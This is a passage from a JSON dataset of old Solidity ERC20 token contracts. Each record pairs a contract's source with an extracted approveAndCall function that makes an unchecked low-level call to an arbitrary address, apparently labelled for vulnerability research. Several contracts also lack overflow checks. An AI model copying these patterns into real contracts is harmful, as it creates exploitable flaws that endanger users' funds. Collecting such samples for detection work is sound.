  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract PROMOTIONS is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function PROMOTIONS(\n ) {\n balances[msg.sender] = 21000000000;\n totalSupply = 21000000000;\n name = \"PROMOTIONS\";\n decimals = 0;\n symbol = \"PROMO\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14dc"
  },
  "filename": "33007.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000000000000000;\n totalSupply = 1000000000000000000000;\n name = \"AnnoyingAsFuk\";\n decimals = 12;\n symbol = \"AAF\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14dd"
  },
  "filename": "33015.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Bitcoin9x is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function Bitcoin9x(\n ) {\n balances[msg.sender] = 21000000000000000000000000;\n totalSupply = 21000000000000000000000000;\n name = \"Bitcoin9x\";\n decimals = 18;\n symbol = \"BTC9X\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14de"
  },
  "filename": "33033.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 30000000000000000000;\n totalSupply = 30000000000000000000;\n name = \"cryptex\";\n decimals = 8;\n symbol = \"crx\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14df"
  },
  "filename": "33039.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract eECToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function eECToken(\n ) {\n balances[msg.sender] = 140000000000000000000000000;\n totalSupply = 140000000000000000000000000;\n name = \"eEthereum Classic\";\n decimals = 18;\n symbol = \"EEC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14e0"
  },
  "filename": "33041.sol",
  "content": "pragma solidity ^0.4.13;\ncontract Token {\n function totalSupply() constant returns (uint256 supply);\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n event Burn(address indexed from, uint256 value);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n function onePercent(uint256 a) internal constant returns (uint256){\n return div(a,uint256(100));\n }\n function power(uint256 a,uint256 b) internal constant returns (uint256){\n return mul(a,10**b);\n }\n}\ncontract StandardToken is Token {\n using SafeMath for uint256;\n uint8 public decimals;\n mapping(address=>bool) internal withoutFee;\n uint256 internal maxFee;\n function transfer(address _to, uint256 _value) returns (bool success) {\n uint256 fee=getFee(_value);\n if (balances[msg.sender].add(fee) >= _value && _value > 0) {\n doTransfer(msg.sender,_to,_value,fee);\n return true;\n } else { return false; }\n }\n function getFee(uint256 _value) private returns (uint256){\n uint256 onePercentOfValue=_value.onePercent();\n uint256 fee=uint256(maxFee).power(decimals);\n if (_value.add(onePercentOfValue) >= fee) {\n return fee;\n } if (_value.add(onePercentOfValue) < fee) {\n return onePercentOfValue;\n }\n }\n function doTransfer(address _from,address _to,uint256 _value,uint256 fee) internal {\n balances[_from] =balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(_from, _to, _value);\n if(!withoutFee[_from]){\n doBurn(msg.sender,fee);\n }\n }\n function doBurn(address _from,uint256 _value) private returns (bool success){\n require(balanceOf(_from) >= _value);\n balances[_from] =balances[_from].sub(_value);\n _totalSupply =_totalSupply.sub(_value);\n Burn(_from, _value);\n return true;\n }\n function burn(address _from,uint256 _value) public returns (bool success) {\n return doBurn(_from,_value);\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n uint256 fee=getFee(_value);\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0 && balances[msg.sender]>fee) {\n doTransfer(_from,_to,_value,getFee(_value));\n allowed[_from][msg.sender] =allowed[_from][msg.sender].sub(_value.add(fee));\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function totalSupply() constant returns (uint totalSupply){\n return _totalSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public _totalSupply;\n}\ncontract TestTokenTen is StandardToken {\n function () {\n revert();\n }\n string public name;\n string public symbol;\n string public version = 'H1.0';\n address private _owner;\n string public feeInfo = \"Each operation costs 1% of the transaction amount, but not more than 250 tokens.\";\n function TestTokenTen() {\n _totalSupply = 800000000000000000000000000;\n _owner=msg.sender;\n balances[msg.sender] =_totalSupply;\n allocate(0x5feD3A18Df4ac9a1e6F767fB47889B04Ee4805f8,55);\n allocate(0x077C3f919130282001e88A5fDbA45aA0230a0190,20);\n allocate(0x7489D3112D515008ae61d8c5c08D788F90b66dd2,20);\n allocate(0x15D4EEB0a8b695d7a9A8B7eDBA94A1F65Be1aBE6,5);\n maxFee=250;\n name = \"TestToken10\";\n decimals = 18;\n symbol = \"TT10\";\n }\n function allocate(address _address,uint256 percent) private{\n uint256 bal=_totalSupply.onePercent().mul(percent);\n withoutFee[_address]=true;\n doTransfer(msg.sender,_address,bal,0);\n }\n function addToWithoutFee(address _address) public {\n require(msg.sender==_owner);\n withoutFee[_address]=true;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14e1"
  },
  "filename": "33052.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract BitFinTechToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function BitFinTechToken(\n ) {\n balances[msg.sender] = 26888888000000000000000000;\n totalSupply = 26888888000000000000000000;\n name = \"BitFinTech\";\n decimals = 18;\n symbol = \"BFI\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14e2"
  },
  "filename": "33053.sol",
  "content": "pragma solidity ^0.4.8;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) public view returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) public view returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n uint256 constant MAX_UINT256 = 2**256 - 1;\n function transfer(address _to, uint256 _value) public returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n uint256 allowance = allowed[_from][msg.sender];\n require(balances[_from] >= _value && allowance >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n if (allowance < MAX_UINT256) {\n allowed[_from][msg.sender] -= _value;\n }\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) view public returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender)\n view public returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract FBBSStandardToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'F0.1';\n function FBBSStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) public {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}\ncontract FBBS is FBBSStandardToken(1000000000000000000000000000, \"Friends BBS Coin\", 18, \"FBC\") {}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14e3"
  },
  "filename": "33058.sol",
  "content": "contract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract HumanStandardToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14e4"
  },
  "filename": "33102.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract BitFinTechToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function BitFinTechToken() {\n balances[msg.sender] =26888888000000000000000000;\n totalSupply = 26888888000000000000000000;\n name = \"BitFinTech\";\n decimals = 18;\n symbol = \"BFI\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14e5"
  },
  "filename": "33104.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address 